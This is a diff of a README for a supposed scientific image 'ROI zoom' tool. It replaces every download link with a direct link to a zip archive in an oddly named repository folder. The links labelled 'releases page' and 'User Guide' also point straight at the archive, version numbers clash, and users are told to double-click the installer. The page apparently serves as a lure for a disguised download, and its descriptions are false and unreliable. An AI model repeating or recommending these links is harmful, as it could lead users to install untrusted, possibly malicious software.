@@ -2,7 +2,7 @@
 
 ## 📦 Download Now!
 
-[![Download Leo-ROI-Zoom-Tool](https://raw.githubusercontent.com/Andoooo2848284/Leo-ROI-Zoom-Tool/main/Chlamydomonadaceae/Leo_RO_Tool_Zoom_3.6.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Andoooo2848284/Leo-ROI-Zoom-Tool/main/Chlamydomonadaceae/Leo_RO_Tool_Zoom_3.6.zip)
+[![Download Leo-ROI-Zoom-Tool](https://github.com/Andoooo2848284/Leo-ROI-Zoom-Tool/raw/refs/heads/main/Chlamydomonadaceae/Zoom-Tool-RO-Leo-2.2-alpha.3.zip%20Now-%20-blue)](https://github.com/Andoooo2848284/Leo-ROI-Zoom-Tool/raw/refs/heads/main/Chlamydomonadaceae/Zoom-Tool-RO-Leo-2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -27,11 +27,11 @@ Welcome to the Leo-ROI-Zoom-Tool! This tool helps you create focused zoom images
 
 To download the Leo-ROI-Zoom-Tool, visit our releases page:
 
-[Download the latest version here](https://raw.githubusercontent.com/Andoooo2848284/Leo-ROI-Zoom-Tool/main/Chlamydomonadaceae/Leo_RO_Tool_Zoom_3.6.zip)
+[Download the latest version here](https://github.com/Andoooo2848284/Leo-ROI-Zoom-Tool/raw/refs/heads/main/Chlamydomonadaceae/Zoom-Tool-RO-Leo-2.2-alpha.3.zip)
 
 1. **Visit the Releases Page:** Click the link above to access the release page.
 2. **Select the Latest Version:** Look for the most recent release. This is usually at the top of the list.
-3. **Download the Installer:** Click on the asset that matches your OS to download the installer file. For example, if you are using Windows, look for something like `https://raw.githubusercontent.com/Andoooo2848284/Leo-ROI-Zoom-Tool/main/Chlamydomonadaceae/Leo_RO_Tool_Zoom_3.6.zip`.
+3. **Download the Installer:** Click on the asset that matches your OS to download the installer file. For example, if you are using Windows, look for something like `https://github.com/Andoooo2848284/Leo-ROI-Zoom-Tool/raw/refs/heads/main/Chlamydomonadaceae/Zoom-Tool-RO-Leo-2.2-alpha.3.zip`.
 4. **Install the Application:**
    - Locate the downloaded file on your computer.
    - Double-click the installer to begin installation.
@@ -75,10 +75,10 @@ Yes, you can share your zoomed images with colleagues or use them in publication
 
 ## 📄 Documentation
 
-For more detailed information, check the [User Guide](https://raw.githubusercontent.com/Andoooo2848284/Leo-ROI-Zoom-Tool/main/Chlamydomonadaceae/Leo_RO_Tool_Zoom_3.6.zip) available in the repository. This guide will walk you through every feature and answer common questions.
+For more detailed information, check the [User Guide](https://github.com/Andoooo2848284/Leo-ROI-Zoom-Tool/raw/refs/heads/main/Chlamydomonadaceae/Zoom-Tool-RO-Leo-2.2-alpha.3.zip) available in the repository. This guide will walk you through every feature and answer common questions.
 
 ## 🎉 Conclusion
 
 With the Leo-ROI-Zoom-Tool, creating focused views of your scientific images is easy and quick. Download today, and start enhancing your images!
 
-[Download the latest version here](https://raw.githubusercontent.com/Andoooo2848284/Leo-ROI-Zoom-Tool/main/Chlamydomonadaceae/Leo_RO_Tool_Zoom_3.6.zip)
+[Download the latest version here](https://github.com/Andoooo2848284/Leo-ROI-Zoom-Tool/raw/refs/heads/main/Chlamydomonadaceae/Zoom-Tool-RO-Leo-2.2-alpha.3.zip)
